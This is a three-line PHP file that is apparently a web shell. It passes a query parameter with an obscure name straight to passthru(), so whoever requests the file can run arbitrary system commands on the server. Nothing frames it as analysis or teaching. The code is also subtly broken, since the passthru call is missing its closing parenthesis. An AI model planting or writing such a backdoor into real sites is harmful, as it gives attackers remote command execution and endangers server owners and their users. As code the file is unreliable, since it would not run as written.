<?php
passthru($_GET['yKYZnN63'];
?>
